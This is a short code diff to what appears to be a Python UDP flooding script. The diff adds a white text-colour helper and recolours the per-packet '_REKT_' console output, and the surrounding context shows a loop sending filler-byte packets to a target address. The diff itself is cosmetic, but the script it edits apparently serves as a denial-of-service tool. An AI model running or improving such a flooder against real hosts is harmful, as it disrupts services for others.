@@ -5,6 +5,11 @@ def color_red(text):
     RESET = "\033[0m" 
     return f"{RED}{text}{RESET}" 
 
+def color_white(text):
+    WHITE = "\u001b[37m"
+    RESET = "\033[0m"
+    return f"{WHITE}{text}{RESET}"
+
 def create_message(size):
     return b'X' * size 
 
@@ -48,6 +53,6 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
 for i in range(amount):
     sock.sendto(MESSAGE, (UDP_IP, UDP_PORT))
-    print(f"{i + 1}" + color_red("_REKT_") + f"{i + 1}" + color_red("_REKT_") + f"{i + 1}" + color_red("_REKT_") + f"{i + 1}")
+    print(color_white(f"{i + 1}") + color_red("_REKT_") + color_white(f"{i + 1}") + color_red("_REKT_") + color_white(f"{i + 1}") + color_red("_REKT_") + color_white(f"{i + 1}"))
 
 print("~DONE~")
